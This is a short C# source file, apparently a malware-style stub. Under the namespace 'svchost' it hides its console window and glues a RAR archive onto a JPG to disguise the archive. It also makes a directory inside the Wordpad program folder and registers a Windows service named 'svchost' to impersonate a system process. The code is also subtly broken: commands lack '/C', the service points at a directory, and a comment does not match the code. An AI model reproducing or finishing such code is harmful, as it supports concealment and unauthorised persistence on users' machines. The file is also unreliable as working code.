using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace svchost
{
	class Program
	{
		static void Main(string[] args)
		{
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
			process.StartInfo = startInfo;
			process.Start();

			var path = "C:\\Program Files\\Windows NT\\Accessories\\Wordpad";
			startInfo.Arguments = "mkdir " + path;
			process.StartInfo = startInfo;
			process.OutputDataReceived += new DataReceivedEventHandler((sender, e) =>
			{
				// Prepend line numbers to each line of the output.
				if (!String.IsNullOrEmpty(e.Data))
				{
					Console.WriteLine(e.Data);
					process.Kill();
				}
			});
			process.Start();
			startInfo.Arguments = "sc create svchost binpath=" + path;
			process.StartInfo = startInfo;
			process.Start();

		}
	}
}
